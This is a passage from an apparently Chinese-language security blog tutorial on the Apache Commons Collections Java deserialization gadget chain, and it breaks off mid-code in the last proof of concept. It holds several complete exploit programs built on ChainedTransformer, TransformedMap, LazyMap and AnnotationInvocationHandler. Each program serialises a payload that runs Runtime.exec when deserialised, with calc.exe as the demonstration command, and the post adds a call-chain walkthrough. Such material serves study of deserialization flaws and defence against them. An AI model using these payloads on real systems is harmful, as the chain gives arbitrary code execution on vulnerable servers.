chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(f);<br>        fout.writeObject(chainedTransformer);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> <span class="hljs-type">FileInputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(fi);<br><br>        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();<br>        transformerChain_now.transform(<span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功模拟序列化与反序列化，实现了客户端自定义payload</p><p>此时，服务端只需满足两个条件，即可执行任意代码</p><ul><li>服务端反序列化我们的ChainedTransformer</li><li>同时调用transform方法</li></ul><p>显然这种调用方法的应用场景很少，我们需要找到更好触发的方式</p><h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>TransformedMap类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p><p><img src="/img/markdown-img-paste-20211116145115237.png"></p><p>通过构造TransformedMap，可以让我们的触发方式，由调用transform方法变为put/putall方法，无疑后者更为普遍。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        Map map = <span class="hljs-keyword">new</span> <span class="hljs-type">HashedMap</span>();<br>        map.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        Map outmap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(f);<br>        fout.writeObject(outmap);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> <span class="hljs-type">FileInputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(fi);<br><br>        Map <span class="hljs-keyword">new</span><span class="hljs-type">map</span> = (Map) fin.readObject();<br>        <span class="hljs-comment">//方式一：</span><br>        <span class="hljs-keyword">new</span><span class="hljs-type">map</span>.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//方式二：AbstractInputCheckedMapDecorator类中的setValue方法会调用TransformedMap中的checkSetValue</span><br>        Map.Entry entry = (Map.Entry)<span class="hljs-keyword">new</span><span class="hljs-type">map</span>.entrySet().iterator().next();<br>        entry.setValue(<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h1><p>LazyMap实现了Map接口，其中的get(Object)方法调用了transform()方法</p><p><img src="/img/markdown-img-paste-20211116152132565.png"></p><p>这里factory可控，在初始化时被赋值</p><p><img src="/img/markdown-img-paste-20211116152231880.png"></p><p>因此亦可以通过Lazymap实现transform的调用</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-type">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-type">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">Class</span>[]&#123;<span class="hljs-keyword">String</span>.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        Map map = <span class="hljs-keyword">new</span> <span class="hljs-type">HashedMap</span>();<br>        <span class="hljs-comment">//反射获取LazyMap类</span><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);<br>        <span class="hljs-comment">//获取所有构造方法</span><br>        Constructor[] constructors = clazz.getDeclaredConstructors();<br>        Constructor constructor = constructors[<span class="hljs-number">0</span>];<br>        <span class="hljs-comment">//取消修饰符限制</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//初始化LazyMap对象</span><br>        LazyMap lazyMap = (LazyMap)constructor.<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>(map,chainedTransformer);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> <span class="hljs-type">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectOutputStream</span>(f);<br>        fout.writeObject(lazyMap);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> <span class="hljs-type">FileInputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectInputStream</span>(fi);<br><br>        Map <span class="hljs-keyword">new</span><span class="hljs-type">map</span> = (LazyMap) fin.readObject();<br>        <span class="hljs-keyword">new</span><span class="hljs-type">map</span>.<span class="hljs-keyword">get</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面两种利用方式已经成功延长了利用链，在服务端仅需反序列化map，再get/put/putall一次，即可实现利用。</p><p>那么有没有直接readObject即可成功利用的方式呢？</p><h1 id="AnnotationInvocationHandler-TransformedMap"><a href="#AnnotationInvocationHandler-TransformedMap" class="headerlink" title="AnnotationInvocationHandler+TransformedMap"></a>AnnotationInvocationHandler+TransformedMap</h1><p>sun.reflect.annotation.AnnotationInvocationHandler类实现了java.lang.reflect.InvocationHandler(Java动态代理)接口和java.io.Serializable接口，它还重写了readObject方法，在readObject方法中调用了var5.setValue<br><img src="/img/markdown-img-paste-20211116160556570.png"><br>如果控制var5的值为TransformedMap的entry对象，那么就能触发TransformedMap#checkSetValue方法。<br>var5的最终数据来源是this.memberValues，而this.memberValues在初始化中被给出<br><img src="/img/markdown-img-paste-20211116160746393.png"></p><p>同时需要满足关键判断<br><code>if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) </code></p><p>再次测试</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.<span class="hljs-built_in">Map</span>;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> &#123;</span><br>    public <span class="hljs-keyword">static</span> <span class="hljs-literal">void</span> main(<span class="hljs-built_in">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>,Class[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        <span class="hljs-built_in">Map</span> <span class="hljs-keyword">map</span> = <span class="hljs-keyword">new</span> HashedMap();<br>        <span class="hljs-keyword">map</span>.put(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-built_in">Map</span> outmap = TransformedMap.decorate(<span class="hljs-keyword">map</span>,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor = clazz.getDeclaredConstructor(Class.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">Map</span>.<span class="hljs-keyword">class</span>);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">Object</span> ob = constructor.newInstance(Retention.<span class="hljs-keyword">class</span>,outmap);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> ObjectOutputStream(f);<br>        fout.writeObject(ob);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);<br><br>        <span class="hljs-built_in">Object</span> o = (<span class="hljs-built_in">Object</span>) fin.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里constructor.newInstance(Retention.class,outmap)的第一个参数使用Retention.class，因为在初始化时，会判断其是否为注解类。</p><p><img src="/img/markdown-img-paste-20211116172934183.png"></p><p>实验结果</p><p><img src="/img/markdown-img-paste-20211116171620552.png"></p><p>发现以下情况，这里出现var7的值为null的情况</p><p>分析流程，发现需要满足以下几个条件</p><ul><li> sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是Annotation的子类</li><li>其中必须含有至少一个方法</li><li>TransformedMap.decorate 修饰的Map中必须有一个键名为方法名的元素</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.<span class="hljs-built_in">Map</span>;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> &#123;</span><br>    public <span class="hljs-keyword">static</span> <span class="hljs-literal">void</span> main(<span class="hljs-built_in">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>,Class[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        <span class="hljs-built_in">Map</span> <span class="hljs-keyword">map</span> = <span class="hljs-keyword">new</span> HashedMap();<br>        <span class="hljs-keyword">map</span>.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-built_in">Map</span> outmap = TransformedMap.decorate(<span class="hljs-keyword">map</span>,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor = clazz.getDeclaredConstructor(Class.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">Map</span>.<span class="hljs-keyword">class</span>);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">Object</span> ob = constructor.newInstance(Retention.<span class="hljs-keyword">class</span>,outmap);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> ObjectOutputStream(f);<br>        fout.writeObject(ob);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);<br><br>        <span class="hljs-built_in">Object</span> o = (<span class="hljs-built_in">Object</span>) fin.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行，完成整个链的调用</p><p><img src="/img/markdown-img-paste-20211116173736390.png"></p><h2 id="调用链展示"><a href="#调用链展示" class="headerlink" title="调用链展示"></a>调用链展示</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ObjectInputStream.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">  -&gt;</span>AnnotationInvocationHandler.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">      -&gt;</span>TransformedMap.entrySet<span class="hljs-function"><span class="hljs-params">()</span>.<span class="hljs-title">iterator</span><span class="hljs-params">()</span>.<span class="hljs-title">next</span><span class="hljs-params">()</span>.<span class="hljs-title">setValue</span><span class="hljs-params">()</span></span><br><span class="hljs-function">          -&gt;</span>TransformedMap.checkSetValue<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">        -&gt;</span>TransformedMap.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">          -&gt;</span>ChainedTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">            -&gt;</span>ConstantTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">            -&gt;</span>InvokerTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">              -&gt;</span>Method.invoke<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                -&gt;</span>Class.getMethod<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">            -&gt;</span>InvokerTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">              -&gt;</span>Method.invoke<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                -&gt;</span>Runtime.getRuntime<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">            -&gt;</span>InvokerTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">              -&gt;</span>Method.invoke<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                -&gt;</span>Runtime.exec()<br>``<span class="javascript"><span class="hljs-string">`   </span></span><br><span class="hljs-string"><span class="javascript"></span></span><br><span class="hljs-string"><span class="javascript"># AnnotationInvocationHandler+Lazymap</span></span><br><span class="hljs-string"><span class="javascript">如果我们使用Lazymap的链路，则我们需要找到一个map.get()的调用，在AnnotationInvocationHandler中的invoke方法，正好存在一个.get()调用</span></span><br><span class="hljs-string"><span class="javascript">![](/img/markdown-img-paste-20211117143933829.png)</span></span><br><span class="hljs-string"><span class="javascript"></span></span><br><span class="hljs-string"><span class="javascript">在readObject方法里调用this.memberValues.entrySet().iterator()方法，其中this.memberValues可以通过调用AnnotationInvocationHandler构造方法，赋值为LazyMap对象，且LazyMap对象被创建动态代理类，代理接口为Map.class，当调用Map.class类中的方法时，将会调用AnnotationInvocationHandler#invoke方法。entrySet方法是Map.class中的方法，因此会进入AnnotationInvocationHandler#invoke方法中，并调用this.memberValues.get(var4)方法，其中this.memberValues是LazyMap，因此完成了sink点的串联，完成整个gadget的构造。</span></span><br><span class="hljs-string"><span class="javascript"></span></span><br><span class="hljs-string"><span class="javascript">## POC</span></span><br></code></pre></td></tr></table></figure><p>import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.*;<br>import org.apache.commons.collections.map.HashedMap;<br>import org.apache.commons.collections.map.LazyMap;<br>import org.apache.commons.collections.map.TransformedMap;</p><p>import java.io.FileInputStream;<br>import java.io.FileOutputStream;<br>import java.io.ObjectInputStream;<br>import java.io.ObjectOutputStream;<br>import java.lang.annotation.Retention;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.InvocationHandler;<br>import java.lang.reflect.Proxy;<br>import java.util.Map;</p><p>public class POC {<br>    public static void main(String[] args) throws Exception {<br>        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{<br>                new ConstantTransformer(Runtime.class),<br>                new InvokerTransformer(“getMethod”,new Class[]{String.class,Class[].class},new Object[]{“getRuntime”, null}),<br>                new InvokerTransformer(“invoke”,new 